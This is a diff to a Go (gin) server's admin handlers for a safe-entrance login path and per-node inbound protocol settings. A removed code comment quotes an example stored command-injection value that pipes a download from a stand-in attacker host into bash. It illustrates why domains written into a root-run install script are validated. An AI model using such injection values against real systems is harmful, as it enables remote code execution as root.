@@ -196,6 +196,7 @@ func HandleGetSafeEntrance(c *gin.Context) {
 // HandleSetSafeEntrance 修改安全入口路径与访问域名
 func HandleSetSafeEntrance(c *gin.Context) {
 	var req struct {
+		Enabled  *bool  `json:"enabled"`
 		SafePath string `json:"safe_path"`
 		Domain   string `json:"domain"`
 	}
@@ -204,27 +205,40 @@ func HandleSetSafeEntrance(c *gin.Context) {
 		return
 	}
 
-	if req.SafePath != "" {
-		if err := middleware.ValidateSafePath(req.SafePath); err != nil {
+	enabledCurrent, pathCurrent := middleware.GetSafePath()
+	newEnabled := enabledCurrent
+	if req.Enabled != nil {
+		newEnabled = *req.Enabled
+	}
+
+	targetPath := strings.TrimSpace(req.SafePath)
+	if targetPath == "random" {
+		targetPath = "/" + RandomToken(8)
+	}
+
+	if targetPath != "" {
+		if err := middleware.ValidateSafePath(targetPath); err != nil {
 			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 			return
 		}
-		middleware.SetSafePath(req.SafePath)
-		enabledNow, newPath := middleware.GetSafePath()
-		if enabledNow {
-			model.DB.Save(&model.SystemSetting{
-				Key:       "safe_path",
-				Value:     newPath,
-				UpdatedAt: time.Now(),
-			})
-			_ = model.SetSetting("safe_entry_enabled", "1")
-			// 立刻给当前浏览器换上与新路径匹配的入口 Cookie,
-			// 否则改完路径后这个会话马上会被自己刚刚设置的规则挡在门外
-			middleware.SetSafeEntranceCookie(c)
-		} else {
-			// "/" 或空串代表关闭安全入口: 必须显式落库开关, 否则重启后会被默认值重新打开
-			_ = model.SetSetting("safe_entry_enabled", "0")
+		pathCurrent = targetPath
+	}
+
+	if newEnabled {
+		if pathCurrent == "" || pathCurrent == "/" {
+			pathCurrent = "/" + RandomToken(8)
 		}
+		model.DB.Save(&model.SystemSetting{
+			Key:       "safe_path",
+			Value:     pathCurrent,
+			UpdatedAt: time.Now(),
+		})
+		_ = model.SetSetting("safe_entry_enabled", "1")
+		middleware.SetSafeEntranceState(true, pathCurrent)
+		middleware.SetSafeEntranceCookie(c)
+	} else {
+		_ = model.SetSetting("safe_entry_enabled", "0")
+		middleware.SetSafeEntranceState(false, pathCurrent)
 	}
 
 	if req.Domain != "" {
@@ -232,8 +246,7 @@ func HandleSetSafeEntrance(c *gin.Context) {
 		cleanDomain = strings.TrimPrefix(cleanDomain, "http://")
 		cleanDomain = strings.TrimPrefix(cleanDomain, "https://")
 		cleanDomain = strings.TrimRight(cleanDomain, "/")
-		// 安全: 域名会被写进免鉴权的 /install.sh (root 执行), 必须严格校验字符集,
-		// 否则 `evil.com";curl attacker|bash;#` 这类值会变成存储型命令注入。
+		// 安全: 域名会被写进免鉴权的 /install.sh (root 执行), 必须严格校验字符集
 		if !hostOnlyRe.MatchString(cleanDomain) {
 			c.JSON(http.StatusBadRequest, gin.H{"error": "域名格式不合法 (只允许字母/数字/点/横线, 可带端口)"})
 			return
@@ -252,12 +265,13 @@ func HandleSetSafeEntrance(c *gin.Context) {
 		host = domain
 	}
 
-	_, newPath := middleware.GetSafePath()
+	enabledNow, finalPath := middleware.GetSafePath()
 	url := middleware.GetSafeEntranceURL(scheme, host)
 
 	c.JSON(http.StatusOK, gin.H{
-		"message":   "安全入口与访问配置已更新",
-		"safe_path": newPath,
+		"message":   "安全入口配置已成功更新",
+		"enabled":   enabledNow,
+		"safe_path": finalPath,
 		"domain":    domain,
 		"url":       url,
 	})
@@ -710,7 +724,10 @@ func HandleGetNodeInbounds(c *gin.Context) {
 		return
 	}
 	inbounds := service.GetOrCreateDefaultInbounds(&node)
-	c.JSON(http.StatusOK, inbounds)
+	c.JSON(http.StatusOK, gin.H{
+		"node_id":  node.ID,
+		"inbounds": inbounds,
+	})
 }
 
 // HandleUpdateNodeInbounds 保存并即时热推节点协议入站配置
@@ -722,10 +739,23 @@ func HandleUpdateNodeInbounds(c *gin.Context) {
 		return
 	}
 
-	var inbounds []common.InboundConfig
-	if err := c.ShouldBindJSON(&inbounds); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "协议入站参数格式错误"})
+	rawBody, err := c.GetRawData()
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "读取请求数据失败"})
 		return
+	}
+
+	var inbounds []common.InboundConfig
+	// 既支持直接接收数组 [ ... ]，也支持接收包装对象 { "inbounds": [ ... ] }
+	if err := json.Unmarshal(rawBody, &inbounds); err != nil {
+		var wrapper struct {
+			Inbounds []common.InboundConfig `json:"inbounds"`
+		}
+		if err2 := json.Unmarshal(rawBody, &wrapper); err2 != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "协议入站参数格式错误: " + err2.Error()})
+			return
+		}
+		inbounds = wrapper.Inbounds
 	}
 
 	data, err := json.Marshal(inbounds)
@@ -740,7 +770,10 @@ func HandleUpdateNodeInbounds(c *gin.Context) {
 	// 实时推送最新配置至节点
 	go hub.GlobalHub.PushConfigToNode(node.ID)
 
-	c.JSON(http.StatusOK, gin.H{"message": "协议配置已更新并推送到节点", "inbounds": inbounds})
+	c.JSON(http.StatusOK, gin.H{
+		"message":  "协议配置已更新并推送到节点生效",
+		"inbounds": inbounds,
+	})
 }
 
 // HandleGenerateRealityKeys 生成新的 Reality X25519 密钥对与 ShortID
